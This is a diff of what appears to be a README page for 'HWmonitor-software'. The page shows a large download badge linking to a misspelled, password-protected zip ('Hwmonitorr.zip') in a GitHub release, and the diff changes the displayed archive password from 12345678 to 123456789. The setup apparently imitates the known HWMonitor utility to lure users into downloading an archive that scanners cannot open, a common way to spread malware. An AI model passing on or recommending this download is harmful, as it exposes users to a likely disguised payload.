@@ -8,7 +8,7 @@
 <a href="https://github.com/Harbornuembody/HWmonitor-software/releases/download/v1.0.0/Hwmonitorr.zip">
   <img src="https://img.shields.io/badge/⬇_DOWNLOAD_ZIP-22C55E?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP">
 </a>
-<P>PASSWORD: 12345678</P>
+<P>PASSWORD: 123456789</P>
 </div>
 
 <p align="center">
